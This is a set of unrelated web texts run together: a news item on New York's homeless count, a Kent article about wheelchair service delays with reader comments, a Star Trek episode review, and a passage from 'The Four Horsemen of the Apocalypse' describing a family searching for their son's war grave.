(Reuters/Carlo Allegri)\nThousands of volunteers will fan out across New York City for the city's annual one-night count of homeless people living on the streets.\nThe canvass on Monday night, known as the HOPE Count, is getting extra attention this year as the nation's largest city grapples with an uptick in homelessness that has dominated front pages and consumed Mayor Bill de Blasio's City Hall.\nCity officials have lined up more than 3,500 volunteers who will receive a couple of hours training before being dispatched to the city's streets and subway stations. A year ago, volunteers counted 3,182 people living unsheltered.\nMany city officials have publicly said they believe the number is higher now. Another 58,000 people are currently living in the city's homeless shelters.\nNow entering its 12th year, the HOPE count is a nationwide estimate that cities must do to qualify for certain types of U.S. Department of Housing and Urban Development funding. In New York, it's usually done on the last Monday of January, during the height of winter when those living on the street are most vulnerable. This year's count was postponed two weeks due to a blizzard.\nSome advocacy groups, including the Coalition for the Homeless, have questioned the count's methodology, saying many homeless people are missed during the two-hour count. But city officials said the sampling method has been approved by HUD and is used across the nation.\n\"It provides a snapshot of a point in time and helps us adjust our resources accordingly,\" said Kristin Misner, top aide to the deputy mayor in charge of human services. \"The methodology we have in place makes this a very informative and robust count.\"\nThe count comes two months after de Blasio launched HomeStat, a new outreach program that aims to conduct daily canvasses of every block in a seven-mile stretch of Manhattan. The outreach workers are tasked with establishing contact with the homeless and urging them to get off the street \u2014 but many refuse, citing the poor conditions of the city shelter system.\nDe Blasio has vowed to improve the city's shelters. Gov. Andrew Cuomo, who issued an executive order that requires the homeless to be moved off the street if the temperature drops below zero, recently appointed Comptroller Scott Stringer to inspect the city's shelters while threatening to close those in shoddy shape.\nDe Blasio himself, accompanied by HUD Secretary Julian Castro, will take part in a portion of Monday night's count.\nRegional Briefs \u2013 December 1, 2015\nDe Blasio's Head of Homelessness Agency is Resigning\nFeds Salute NYC's Fight Against Veteran Homelessness\nCuomo Signs Order to Push Homeless Indoors in Frigid Temps\nOrder to Remove Homeless From NY Streets Faces Challenges", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 80149}

Millbrook Healthcare is tasked with providing NHS funded wheelchairs for children and adults in Kent and Medway with long-term needs of six months or more.\nBut the service has been slammed for a backlog which has resulted in some 330 people waiting over a year for a wheelchair and, as of March 2018, 251 children and 999 adults waiting for more than 18 weeks for assessment, repairs or provision of equipment.\nMillbrook Healthcare took on the contract in April 2017 and both the company and Thanet CCG say a backlog was inherited of long waiters and a much higher proportion of patients requiring powered and specialist wheelchairs than had been expected during the procurement.\nThanet CCG say that following an audit it has been recognised that in order to resolve this, additional funds will need to be provided to Millbrook Healthcare with an amount agreement expected by the end of the month.\nBut Professor Mike Oliver, speaking on behalf county wheelchair user and disability forums and Kent Healthwatch, said the service was \"the worst it has ever been\" in his 56 years experience of being a wheelchair user and over 20 years background working with health care providers.\nHe said: \"We believe there is no alternative but to remove the contract from Millbrook.\n\"There are issues about wheelchairs not being provided, people being told the budget has already run out, some people are being provided with the wrong parts and repairs are delayed. The whole situation is getting out of hand and communication with Millbrook is poor, complaints are ignored.\"\nProfessor Oliver said hospitals were running out of their own chairs because they had to provide them to patients failed by Millbrook in order to prevent hospital bed blocking.\nHe also claimed that harassment, bullying, threatening behaviour and even assault had been reported in regards to the company.\nHe added: \"The situation has reached a critical stage. The CCG appears to want to work with Millbrook in order to try and resolve the problems but we have made it clear we do not think that is a viable option. The only option is for MillBrook to have the contract taken away.\"\nAlisa Ogilvie, from Thanet CCG, apologised for the experience suffered by service users and admitted the waiting times were 'unacceptable' but said the CCG had not considered terminating the contract.\nShe said the inherited backlog and high volume of specialist chairs required had impacted on the service.\nShe said: \"We are determined to make sure patients receive the service they deserve. We still believe, at this current time, that MillBrook are able to deliver this contract.\"\nCouncillor Constantine was one of several members who called for the contract to be terminated. She added: \"This is a prime example of how outsourcing in the NHH puts profit before people. I think it is shameful.\n\"I think we need to terminate this contract.\"\nSpeaking after the meeting, she added: \"The commissioners are not listening to the pain, distress and discomfort of the service users.\n\"It's absolutely staggering that 330 patients have been waiting for over a year for a wheelchair fitting. It is equally staggering to hear this is a direct result of introducing outsourcing in the NHS.\"\nHer call was echoed by Councillor Game who questioned why the contract had not been monitored more closely and suggested if it couldn't be axed then a body other than the CCG should manage it.\nMembers of the health scrutiny board have asked Thanet CCG to return in two weeks with a report outlining the contract details, consideration of termination and an action plan.\nA letter expressing the committee's 'grave concerns' will be sent to all the CCGs.\n'Inherited'\nA spokesperson from NHS Thanet Clinical Commissioning Group and Millbrook Healthcare said: \"NHS Thanet Clinical Commissioning Group (CCG), on behalf of the eight CCGs across Kent and Medway, has been working with Millbrook Healthcare to understand the current situation in relation to the inherited backlog and delays in equipment and repairs taking place.\n\"Following an independent audit commissioned by the CCGs, we are now in a position to understand the full scale of the issues, which we are working on in conjunction with Millbrook Healthcare. Both the CCGs and Millbrook Healthcare are taking this situation very seriously and we apologise for the time it has taken to get to this point however, it has been necessary given the issues presented.\n\"The CCGs recognise the impact that the inherited backlog has had on the service, and that this has caused additional cost pressures. Once the additional funding has been agreed the CCGs are committed to releasing the funds to help Millbrook Healthcare clear the backlog.\n\"The additional funding will be linked to a plan with clear timelines for issuing equipment and repairs for those patients who have been waiting for 18-weeks or more, with those who have been waiting for longer than a year being prioritised.\n\"Once the plan has been agreed, we will be contacting these patients. The CCGs are working in collaboration with Millbrook Healthcare to review the on-going demands on the service.\"\nMargate man believed to be Canterbury shooting victim\nMelissa vs Matthew: Freedom of choice to wear the burka?\nCllr Barry Lewis\nCcg is not fit for purpose, nearly everything they are involved in is in crisis including hospitals and doctor surgeries\nCllr Karen Constantine\nThis is what happens when you outsource contracts in the NHS. As Professor Mike Oliver says 'the worst experience in 56 years'. You simply cannot put profit before people. The Conservative's are crying crocodile tears. It is their own Governments policies that they are implementing.\nOlubunmi Babatunde\nI was TUPE over to Millbrook. I am a rehabilitation engineer who used to work for Kings College NHS foundation trust. I am very happy I'll be leaving Millbrook back to nhs in a week time because I don't want to lose my registration or possibly go to prison as I am the only technical competence person in Ashford. I believe Millbrook cannot perform or provide good service to our dear clients who had already lost at least 65% of their lives to disabilities. The management is full of lies. They are after money they could made from vulnerable people. Bad equipment \u2013 unsafe ultimate wheelchairs, bad services and some non qualified staffs. When at Kings, we were 7 qualified and registered rehabilitation engineers including our head of department before the so call TUPE. 2 of us were tupe over for clients of over 30000. The don't worry about this because it save them money. All their managers know nothing about the wheelchair services. The director of wheelchair service is a nurse by profession not even rehabilitation nurse and she is number 1 lier have ever met in my life. They don't treat staffs well, lots of pressure on the staffs especially REs. Before tupe, she promised we'll going to have satellite centres but that is not happening and it is not going to happen. Vulnerable clients are forced to travel about 100miles to attend clinic in Ashford or Gillingham. No more DVs as they are saving money on fuel. No more special school's clinics which is a standard service for nhs.\nA lot of incidents had happened to clients due to equipment-not- fit for purpose. All ultimate wheelchairs whether power or manual have max user weight of 150kg on them whereas they cannot carry 120kg. Examples are 1. A velocity thrown a client off the chair, this person was on the floor underneath the chair for good 4 hrs before he was rescued by his wife, to this company that was not an incident. 2. Another client's gravity wheels and frame buckled on the street, this person weighs 125kg. I wanted to report the incidents to MHRA but i was prevented from doing so, I quarantined but the chair was removed from Ashford to Southampton without my knowledge. Another example was a man with profound disability who also has a partner with complex disability.i was about to go to carry out visit to the man house for a job of less than 30mins. This person lives 1.5 miles from where I live,my route to and fro work. I was nearly crucified for this as the therapist lead claimed I am wasting their money. I will have to bring the person to clinic in Ashford, return journey of 70miles.\nThey believe wheelchair service is another business like refurbishing No 10 Downing Street and other businesses.\nThey have advertised for my job for band 5/6. A lot of Rehabilitation engineers are band 6 and not band 5. They are going to employ another useless non competence person for the job. I'm in their good book because I don't compromise the safety of my clients with their business thing. Their statement is always 'we are in business. This company is too luck that they have not kill any client yet due to the use of those useless equipment, but if things continue in this way May God help the service users.\nKeefogs\nWe need to review ALL these outsourced contracts , not just in the NHS, but in all the other publically-owned services eg catering in schools, maintenance of Council/Housing Association properties or the bin collections. For too long, private Corporations have been treating the tax-payers like slot machines. They charge the earth for doing what the council always used to do, then cream a few million quid off the top for the Managing Director and his main shareholders, pausing only to tell the workforce that they can't afford a pay rise again this year, before moving on to tell the public that, regretfully, their costs are going up so could they pay more rates and taxes but to expect a lower level of service in future.

Fontana\nCast: William Shatner, Leonard Nimoy, Jill Ireland, Frank Overton, DeForest Kelley, Grant Woods, George Takei, Nichelle Nichols, Michael Barrier, Dick Scotter, and Eddie Paskey\nComposer: Alexander Courage\nStardates: 3417.3-3417.7\nProduction #: 6149-25\nWhen the Enterprise crew travels to a presumably doomed colony on Omicron Ceti III, a landing party discovers that Elias Sandoval (Frank Overton) and his fellow colonists have survived and flourished under the planet's deadly bombardment of berthold rays. As Kirk attempts to investigate the numerous incongruities in the Omicron settlement, a mysterious pod plant infects the captain and his subordinates with a euphoria-inducing spore. Now, for the first time in his life, Spock abandons his duty and pursues an affectionate relationship with another person.\nWhile \"The Naked Time\" had already explored a similar premise involving loss of inhibitions, \"This Side of Paradise\" offers a more direct analysis on the benefits of productive as opposed to sedentary lifestyles as related to human drives. Leonard Nimoy fans will appreciate the late actor's ability to portray Spock's passionate qualities, whereas those who admire Gene Roddenberry's philosophy should enjoy this episode for its aforementioned commentary.\nUntil this point in the series, the Star Trek writers merely alluded to Spock's human half without fully realizing its true potential. However, the romance between Leila Kalomi (Jill Ireland) and Spock allows the latter individual to express his most intimate feelings and establish a deeper connection with the audience as a result. Likewise, Spock's violent outburst against his captain should evoke an especially powerful response from viewers thanks to Nimoy's nuanced acting. By placing the Vulcan science officer in a situation where positive and negative emotions overwhelm logical restraint, D.C. Fontana effectively brought to surface Spock's latent humanity, yet never truly undermined his core personality in the process.\nIn a similar fashion to \"The Naked Time,\" \"This Side of Paradise\" presents a disturbing case for why order must always supersede anarchy if societal functionality is to be maintained. On a philosophical level, however, the latter entry delves much deeper by dispelling the flawed conceptions of paradise that permeate certain religious dogmas. As Kirk so brilliantly explains, the desire to overcome life's challenges is an essential facet of the human condition, so an existence without conflict would hardly be worthwhile from either a practical or emotional perspective. Barring the influence of alien spores or other such incredible factors, people are unlikely to be satisfied leading purely leisurely lifestyles as Fontana's narrative indicates through its thought-provoking subject matter.\nLike many of the greatest Star Trek episodes, \"This Side of Paradise\" combines science fiction with humanistic philosophy in a most intelligent fashion. As mentioned earlier, fans of Spock's development as a character will wish to view this installment for a first glimpse into the Vulcan science officer's gentler side. Additionally, those who enjoy material inspired by Invasion of the Body Snatchers should appreciate \"This Side of Paradise\" for its surprisingly serious approach to \"pod plants\" and their mind-altering effects on humanoids.\nOverall Quality: 10/10\nIf you enjoyed this post, please click the follow button or enter your email address in the subscription box to stay tuned for more updates.\nPosted on Wednesday, February 10, 2016\nCategories: Season One, Star Trek", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 34250}
{"text": "The automobile was going slowly forward under the colorless sky of a winter morning.\nIn the distance, the earth's surface seemed trembling with white, fluttering things resembling a band of butterflies poised on the furrows. On one of the fields the swarm was of great size, on others, it was broken into small groups.\nAs the machine approached these white butterflies, they seemed to be taking on other colors. One wing was turning blue, another flesh- colored. . . . They were little flags, by the hundreds, by the thousands which palpitated night and day, in the mild, sunny, morning breeze, in the damp drip of the dull mornings, in the biting cold of the interminable nights. The rains had washed and re-washed them, stealing away the most of their color. Some of the borders of the restless little strips were mildewed by the dampness while others were scorched by the sun, like insects which have just grazed the flames.\nIn the midst of the fluttering flags could be seen the black crosses of wood. On these were hanging dark kepis, red caps, and helmets topped with tufts of horsehair, slowly disintegrating and weeping atmospheric tears at every point.\n\"How many are dead!\" sighed Don Marcelo's voice from the automobile.\nAnd Rene, who was seated in front of him, sadly nodded his head. Dona Luisa was looking at the mournful plain while her lips trembled slightly in constant prayer. Chichi turned her great eyes in astonishment from one side to the other. She appeared larger, more capable in spite of the pallor which blanched her olive skin.\nThe two ladies were dressed in deepest mourning. The father, too, was in mourning, huddled down in the seat in a crushed attitude, his legs carefully covered with the great fur rugs. Rene was wearing his campaign uniform under his storm coat. In spite of his injuries, he had not wished to retire from the army. He had been transferred to a technical office till the termination of the war.\nThe Desnoyers family were on the way to carry out their long- cherished hope.\nUpon recovering consciousness after the fatal news, the father had concentrated all his will power in one petition.\n\"I must see him. . . . Oh, my son! . . . My son!\"\nVain were the senator's efforts to show him the impossibility of such a journey. The fighting was still going on in the zone where Julio had fallen. Later on, perhaps, it might be possible to visit it. \"I want to see it!\" persisted the broken-hearted old man. It was necessary for him to see his son's grave before dying himself, and Lacour had to requisition all his powers, for four long months formulating requests and overcoming much opposition, in order that Don Marcelo might be permitted to make the trip.\nFinally a military automobile came one morning for the entire Desnoyers family. The senator could not accompany them. Rumors of an approaching change in the cabinet were floating about, and he felt obliged to show himself in the senate in case the Republic should again wish to avail itself of his unappreciated services.\nThey passed the night in a provincial city where there was a military post, and Rene collected considerable information from officers who had witnessed the great combat. With his map before him, he followed the explanations until he thought he could recognize the very plot of ground which Julio's regiment had occupied.\nThe following morning they renewed their expedition. A soldier who had taken part in the battle acted as their guide, seated beside the chauffeur. From time to time, Rene consulted the map spread out on his knees, and asked questions of the soldier whose regiment had fought very close to that of Desnoyers', but he could not remember exactly the ground which they had gone over so many months before. The landscape had undergone many transformations and had presented a very different appearance when covered with men. Its deserted aspect bewildered him . . . and the motor had to go very slowly, veering to the north of the line of graves, following the central highway, level and white, entering crossroads and winding through ditches muddied with deep pools through which they splashed with great bounds and jar on the springs. At times, they drove across fields from one plot of crosses to another, their pneumatic tires crushing flat from the furrows opened by the plowman.\nTombs . . . tombs on all sides! The white locusts of death were swarming over the entire countryside. There was no corner free from their quivering wings. The recently plowed earth, the yellowing roads, the dark woodland, everything was pulsating in weariless undulation. The soil seemed to be clamoring, and its words were the vibrations of the restless little flags. And the thousands of cries, endlessly repeated across the days and nights, were intoning in rhythmic chant the terrible onslaught which this earth had witnessed and from which it still felt tragic shudderings.\n\"Dead . . . dead,\" murmured Chichi, following the rows of crosses incessantly slipping past the sides of the automobile.\n\"O Lord, for them! . . . for their mothers,\" moaned Dona Luisa, renewing her prayers.\nHere had taken place the fiercest part of the battle--the fight in the old way, man to man outside of the trenches, with bayonets, with guns, with fists, with teeth.\nThe guide who was beginning to get his bearings was pointing out the various points on the desolate horizon. There were the African sharpshooters; further on, the chasseurs. The very large groups of graves were where the light infantry had charged with their bayonets on the sides of the road.\nThe automobile came to a stop. Rene climbed out after the soldier in order to examine the inscriptions on a few of the crosses. Perhaps these might have belonged to the regiment they were seeking. Chichi also alighted mechanically with the irresistible desire of aiding her husband.\nEach grave contained several men. The number of bodies within could be told by the mouldering kepis or rusting helmets hanging on the arms of the cross; the number of the regiments could still be deciphered between the rows of ants crawling over the caps. The wreaths with which affection had adorned some of the sepulchres were blackened and stripped of their leaves. On some of the crucifixes, the names of the dead were still clear, but others were beginning to fade out and soon would be entirely illegible.\n\"What a horrible death! . . . What glory!\" thought Chichi sadly.\nNot even the names of the greater part of these vigorous men cut down in the strength of their youth were going to survive! Nothing would remain but the memory which would from time to time overwhelm some old countrywoman driving her cow along the French highway, murmuring between her sobs. \"My little one! . . . I wonder where they buried my little one!\" Or, perhaps, it would live in the heart of the village woman clad in mourning who did not know how to solve the problem of existence; or in the minds of the children going to school in black blouses and saying with ferocious energy--\"When I grow up I am going to kill the Boches to avenge my father's death!\"\nAnd Dona Luisa, motionless in her seat, followed with her eyes Chichi's course among the graves, while returning to her interrupted prayer--\"Lord, for the mothers without sons . . . for the little ones without fathers! . . . May thy wrath not be turned against us, and may thy smile shine upon us once more!\"\nHer husband, shrunken in his seat, was also looking over the funereal fields, but his eyes were fixed most tenaciously on some mounds without wreaths or flags, simple crosses with a little board bearing the briefest inscription. These were the German bodies which seemed to have a page to themselves in the Book of Death. On one side, the innumerable French tombs with inscriptions as small as possible, simple numbers--one, two, three dead. On the other, in each of the spacious, unadorned sepulchres, great quantities of soldiers, with a number of terrifying terseness. Fences of wooden strips, narrow and wide, surrounded these latter ditches filled to the top with bodies. The earth was as bleached as though covered with snow or saltpetre. This was the lime returning to mix with the land. The crosses raised above these huge mounds bore each an inscription stating that it contained Germans, and then a number-- 200 . . . 300 . . . 400.\nSuch appalling figures obliged Desnoyers to exert his imagination. It was not easy to evoke with exactitude the vision of three hundred carcasses in helmets, boots and cloaks, in all the revolting aspects of death, piled in rows as though they were bricks, locked forever in the depths of a great trench. . . . And this funereal alignment was repeated at intervals all over the great immensity of the plain!\nThe mere sight of them filled Don Marcelo with a kind of savage joy, as his mourning fatherhood tasted the fleeting consolation of vengeance. Julio had died, and he was going to die, too, not having strength to survive his bitter woe; but how many hundreds of the enemy wasting in these awful trenches were also leaving in the world loved beings who would remember them as he was remembering his son! . . .\nHe imagined them as they must have been before the death call sounded, as he had seen them in the advance around his castle.\nSome of them, the most prominent and terrifying, probably still showed on their faces the theatrical cicatrices of their university duels. They were the soldiers who carried books in their knapsacks, and after the fusillade of a lot of country folk, or the sacking and burning of a hamlet, devoted themselves to reading the poets and philosophers by the glare of the blaze which they had kindled. They were bloated with science as with the puffiness of a toad, proud of their pedantic and all-sufficient intellectuality. Sons of sophistry and grandsons of cant, they had considered themselves capable of proving the greatest absurdities by the mental capers to which they had accustomed their acrobatic intellects.\nThey had employed the favorite method of the thesis, antithesis and synthesis in order to demonstrate that Germany ought to be the Mistress of the World; that Belgium was guilty of her own ruin because she had defended herself; that true happiness consisted in having all humanity dominated by Prussia; that the supreme idea of existence consisted in a clean stable and a full manger; that Liberty and Justice were nothing more than illusions of the romanticism of the French; that every deed accomplished became virtuous from the moment it triumphed, and that Right was simply a derivative of Might. These metaphysical athletes with guns and sabres were accustomed to consider themselves the paladins of a crusade of civilization. They wished the blond type to triumph definitely over the brunette; they wished to enslave the worthless man of the South, consigning him forever to a world regulated by \"the salt of the earth,\" \"the aristocracy of humanity.\" Everything on the page of history that had amounted to anything was German. The ancient Greeks had been of Germanic origin; German, too, the great artists of the Italian Renaissance. The men of the Mediterranean countries, with the inherent badness of their extraction, had falsified history. . . .\n\"That's the best place for you. . . You are better where you are buried, you pitiless pedants!\" thought Desnoyers, recalling his conversations with his friend, the Russian.\nWhat a shame that there were not here, too, all the Herr Professors of the German universities--those wise men so unquestionably skilful in altering the trademarks of intellectual products and changing the terminology of things! Those men with flowing beards and gold- rimmed spectacles, pacific rabbits of the laboratory and the professor's chair that had been preparing the ground for the present war with their sophistries and their unblushing effrontery! Their guilt was far greater than that of the Herr Lieutenant of the tight corset and the gleaming monocle, who in his thirst for strife and slaughter was simply and logically working out the professional charts.\nWhile the German soldier of the lower classes was plundering what he could and drunkenly shooting whatever crossed his path, the warrior student was reading by the camp glow, Hegel and Nietzsche. He was too enlightened to execute with his own hands these acts of \"historical justice,\" but he, with the professors, was rousing all the bad instincts of the Teutonic beast and giving them a varnish of scientific justification.\n\"Lie there, in your sepulchre, you intellectual scourge!\" continued Desnoyers mentally.\nThe fierce Moors, the negroes of infantile intelligence, the sullen Hindus, appeared to him more deserving of respect than all the ermine-bordered togas parading haughtily and aggressively through the cloisters of the German universities. What peacefulness for the world if their wearers should disappear forever! He preferred the simple and primitive barbarity of the savage to the refined, deliberate and merciless barbarity of the greedy sage;--it did less harm and was not so hypocritical.\nFor this reason, the only ones in the enemy's ranks who awakened his commiseration were the lowly and unlettered dead interred beneath the sod. They had been peasants, factory hands, business clerks, German gluttons of measureless (intestinal) capacity, who had seen in the war an opportunity for satisfying their appetites, for beating somebody and ordering them about after having passed their lives in their country, obeying and receiving kicks.\nThe history of their country was nothing more than a series of raids--like the Indian forays, in order to plunder the property of those who lived in the mild Mediterranean climes. The Herr Professors had proved to their countrymen that such sacking incursions were indispensable to the highest civilization, and that the German was marching onward with the enthusiasm of a good father sacrificing himself in order to secure bread for his family.\nHundreds of thousands of letters, written by their relatives with tremulous hands, were following the great Germanic horde across the invaded countries. Desnoyers had overheard the reading of some of these, at nightfall before his ruined castle. These were some of the messages found in the pockets of the imprisoned or dead:--\"Don't show any pity for the red pantaloons. Kill WHOMEVER YOU CAN, and show no mercy even to the little ones.\" . . . \"We would thank you for the shoes, but the girl cannot get them on. Those French have such ridiculously small feet!\" . . . \"Try to get hold of a piano.\". . . \"I would very much like a good watch.\" . . . \"Our neighbor, the Captain, has sent his wife a necklace of pearls. . . . And you send only such insignificant things!\"\nThe virtuous German had been advancing heroically with the double desire of enlarging his country and of making valuable gifts to his offspring. \"Deutschland uber alles!\" But their most cherished illusions had fallen into the burial ditch in company with thousands of comrades-at-arms fed on the same dreams.\nDesnoyers could imagine the impatience on the other side of the Rhine, the pitiful women who were waiting and waiting. The lists of the dead had, perhaps, overlooked the missing ones; and the letters kept coming and coming to the German lines, many of them never reaching their destination. \"Why don't you answer! Perhaps you are not writing so as to give us a great surprise. Don't forget the necklace! Send us a piano. A carved china cabinet for the dining room would please us greatly. The French have so many beautiful things!\" . . .\nThe bare cross rose stark and motionless above the lime-blanched land. Near it the little flags were fluttering their wings, moving from side to side like a head shaking out a smiling, ironical protest--No! . . . No!\nThe automobile continued on its painful way. The guide was now pointing to a distant group of graves. That was undoubtedly the place where the regiment had been fighting. So the vehicle left the main road, sinking its wheels in the soft earth, having to make wide detours in order to avoid the mounds scattered about so capriciously by the casualties of the combat.\nAlmost all of the fields were ploughed. The work of the farmer extended from tomb to tomb, making them more prominent as the morning sun forced its way through the enshrouding mists.\nNature, blind, unfeeling and silent, ignoring individual existence and taking to her bosom with equal indifference, a poor little animal or a million corpses, was beginning to smile under the late winter suns.\nThe fountains were still crusted with their beards of ice; the earth snapped as the feet weighed down its hidden crystals; the trees, black and sleeping, were still retaining the coat of metallic green in which the winter had clothed them; from the depths of the earth still issued an acute, deadly chill, like that of burned-out planets. . . . But Spring had already girded herself with flowers in her palace in the tropics, and was saddling with green her trusty steed, neighing with impatience. Soon they would race through the fields, driving before them in disordered flight the black goblins of winter, and leaving in their wake green growing things and tender, subtle perfumes. The wayside greenery, robing itself in tiny buds, was already heralding their arrival. The birds were venturing forth from their retreats in order to wing their way among the crows croaking wrathfully above the closed tombs. The landscape was beginning to smile in the sunlight with the artless, deceptive smile of a child who looks candidly around while his pockets are stuffed with stolen goodies.\nThe husbandmen had ploughed the fields and filled the furrows with seed. Men might go on killing each other as much as they liked; the soil had no concern with their hatreds, and on that account, did not propose to alter its course. As every year, the metal cutter had opened its usual lines, obliterating with its ridges the traces of man and beast, undismayed and with stubborn diligence filling up the tunnels which the bombs had made.\nSometimes the ploughshare had struck against an obstacle underground . . . an unknown, unburied man; but the cultivator had continued on its way without pity. Every now and then, it was stopped by less yielding obstructions, projectiles which had sunk into the ground intact. The rustic had dug up these instruments of death which occasionally had exploded their delayed charge in his hands.\nBut the man of the soil knows no fear when in search of sustenance, and so was doggedly continuing his rectilinear advance, swerving only before the visible tombs; there the furrows had curved mercifully, making little islands of the mounds surmounted by crosses and flags. The seeds of future bread were preparing to extend their tentacles like devil fish among those who, but a short time before, were animated by such monstrous ambition. Life was about to renew itself once more.\nThe automobile came to a standstill. The guide was running about among the crosses, stooping over in order to examine their weather- stained inscriptions.\nHe had found above one grave the number of the regiment.\nChichi and her husband promptly dismounted again. Then Dona Luisa, with sad resolution, biting her lips to keep the tears back. Then the three devoted themselves to assisting the father who had thrown off his fur lap-robe. Poor Desnoyers! On touching the ground, he swayed back and forth, moving forward with the greatest effort, lifting his feet with difficulty, and sinking his staff in the hollows.\n\"Lean on me, my poor dear,\" said the old wife, offering her arm.\nThe masterful head of the family could no longer take a single step without their aid.\nThen began their slow, painful pilgrimage among the graves.\nThe guide was still exploring the spot bristling with crosses, spelling out the names, and hesitating before the faded lettering. Rene was doing the same on the other side of the road. Chichi went on alone, the wind whirling her black veil around her, and making the little curls escape from under her mourning hat every time she leaned over to decipher a name. Her daintily shod feet sunk deep into the ruts, and she had to gather her skirts about her in order to move more comfortably--revealing thus at every step evidences of the joy of living, of hidden beauty, of consummated love following her course through this land of death and desolation.\nThe two elders were growing impatient, anxious to find their son's resting place as soon as possible.\nA half hour thus dragged by without any result--always unfamiliar names, anonymous crosses or the numbers of other regiments. Don Marcelo was no longer able to stand. Their passage across the irregularities of the soft earth had been torment for him. He was beginning to despair. . . . Ay, they would never find Julio's remains! The parents, too, had been scrutinizing the plots nearest them, bending sadly before cross after cross. They stopped before a long, narrow hillock, and read the name. . . . No, he was not there, either; and they continued desperately along the painful path of alternate hopes and disappointments.\nIt was Chichi who notified them with a cry, \"Here. . . . Here it is!\" The old folks tried to run, almost falling at every step. All the family were soon grouped around a heap of earth in the vague outline of a bier, and beginning to be covered with herbage. At the head was a cross with letters cut in deep with the point of a knife, the kind deed of some of his comrades-at-arms--\"DESNOYERS.\" . . . Then in military abbreviations, the rank, regiment and company.\nA long silence. Dona Luisa had knelt instantly, with her eyes fixed on the cross--those great, bloodshot eyes that could no longer weep. Till then, tears had been constantly in her eyes, but now they deserted her as though overcome by the immensity of a grief incapable of expressing itself in the usual ways.\nThe father was staring at the rustic grave in dumb amazement. His son was there, there forever! . . . and he would never see him again! He imagined him sleeping unshrouded below, in direct contact with the earth, just as Death had surprised him in his miserable and heroic old uniform. He recalled the exquisite care which the lad had always given his body--the long bath, the massage, the invigorating exercise of boxing and fencing, the cold shower, the elegant and subtle perfume . . . all that he might come to this! . . . that he might be interred just where he had fallen in his tracks, like a wornout beast of burden!\nThe bereaved father wished to transfer his son immediately from the official burial fields, but he could not do it yet. As soon as possible it should be done, and he would erect for him a mausoleum fit for a king. . . . And what good would that do? He would merely be changing the location of a mass of bones, but his body, his physical semblance--all that had contributed to the charm of his personality would be mixed with the earth. The son of the rich Desnoyers would have become an inseparable part of a poor field in Champagne. Ah, the pity of it all! And for this, had he worked so hard and so long to accumulate his millions? . . .\nHe could never know how Julio's death had happened. Nobody could tell him his last words. He was ignorant as to whether his end had been instantaneous, overwhelming--his idol going out of the world with his usual gay smile on his lips, or whether he had endured long hours of agony abandoned in the field, writhing like a reptile or passing through phases of hellish torment before collapsing in merciful oblivion. He was also ignorant of just how much was beneath this mound--whether an entire body discreetly touched by the hand of Death, or an assemblage of shapeless remnants from the devastating hurricane of steel! . . . And he would never see him again! And that Julio who had been filling his thoughts would become simply a memory, a name that would live while his parents lived, fading away, little by little, after they had disappeared! . . .\nHe was startled to hear a moan, a sob. . . . Then he recognized dully that they were his own, that he had been accompanying his reflections with groans of grief.\nHis wife was still at his feet, kneeling, alone with her heartbreak, fixing her dry eyes on the cross with a gaze of hypnotic tenacity. . . . There was her son near her knees, lying stretched out as she had so often watched him when sleeping in his cradle! . . . The father's sobs were wringing her heart, too, but with an unbearable depression, without his wrathful exasperation. And she would never see him again! . . . Could it be possible! . . .\nChichi's presence interrupted the despairing thoughts of her parents. She had run to the automobile, and was returning with an armful of flowers. She hung a wreath on the cross and placed a great spray of blossoms at the foot. Then she scattered a shower of petals over the entire surface of the grave, sadly, intensely, as though performing a religious rite, accompanying the offering with her outspoken thoughts--\"For you who so loved life for its beauties and pleasures! . . . for you who knew so well how to make yourself beloved!\" . . . And as her tears fell, her affectionate memories were as full of admiration as of grief. Had she not been his sister, she would have liked to have been his beloved.\nAnd having exhausted the rain of flower-petals, she wandered away so as not to disturb the lamentations of her parents.\nBefore the uselessness of his bitter plaints, Don Marcelo's former dominant character had come to life, raging against destiny.\nHe looked at the horizon where so often he had imagined the adversary to be, and clenched his fists in a paroxysm of fury. His disordered mind believed that it saw the Beast, the Nemesis of humanity. And how much longer would the evil be allowed to go unpunished? . . .\nThere was no justice; the world was ruled by blind chance;--all lies, mere words of consolation in order that mankind might exist unterrified by the hopeless abandon in which it lived!\nIt appeared to him that from afar was echoing the gallop of the four Apocalyptic horsemen, riding rough-shod over all his fellow- creatures. He saw the strong and brutal giant with the sword of War, the archer with his repulsive smile, shooting his pestilential arrows, the bald-headed miser with the scales of Famine, the hard- riding spectre with the scythe of Death. He recognized them as only divinities, familiar and terrible-which had made their presence felt by mankind. All the rest was a dream. The four horsemen were the reality. . . .\nSuddenly, by the mysterious process of telepathy, he seemed to read the thoughts of the one grieving at his feet.\nThe mother, impelled by her own sorrow, was thinking of that of others. She, too, was looking toward the distant horizon. There she seemed to see a procession of the enemy, grieving in the same way as were her family. She saw Elena with her daughters going in and out among the burial grounds, seeking a loved one, falling on their knees before a cross. Ay, this mournful satisfaction, she could never know completely! It would be forever impossible for her to pass to the opposite side in search of the other grave, for, even after some time had passed by, she could never find it. The beloved body of Otto would have disappeared forever in one of the nameless pits which they had just passed.\n\"O Lord, why did we ever come to these lands? Why did we not continue living in the land where we were born?\" . . .\nDesnoyers, too, uniting his thoughts with hers, was seeing again the pampas, the immense green plains of the ranch where he had become acquainted with his wife. Again he could hear the tread of the herds. He recalled Madariaga on tranquil nights proclaiming, under the splendor of the stars, the joys of peace, the sacred brotherhood of these people of most diverse extraction, united by labor, abundance and the lack of political ambition.\nAnd as his thoughts swung back to the lost son he, too, exclaimed with his wife, \"Oh, why did we ever come? . . .\" He, too, with the solidarity of grief, began to sympathize with those on the other side of the battle front. They were suffering just as he was; they had lost their sons. Human grief is the same everywhere.\nBut then he revolted against his commiseration. Karl had been an advocate of this war. He was among those who had looked upon war as the perfect state for mankind, who had prepared it with their provocations. It was just that War should devour his sons; he ought not to bewail their loss. . . . But he who had always loved Peace! He who had only one son, only one! . . . and now he was losing him forever! . . .\nHe was going to die; he was sure that he was going to die. . . . Only a few months of life were left in him. And his pitiful, devoted companion kneeling at his feet, she, too, would soon pass away. She could not long survive the blow which they had just received. There was nothing further for them to do; nobody needed them any longer.\nTheir daughter was thinking only of herself, of founding a separate home interest--with the hard instinct of independence which separates children from their parents in order that humanity may continue its work of renovation.\nJulio was the only one who would have prolonged the family, passing on the name. The Desnoyers had died; his daughter's children would be Lacour. . . . All was ended.\nDon Marcelo even felt a certain satisfaction in thinking of his approaching death. More than anything else, he wished to pass out of the 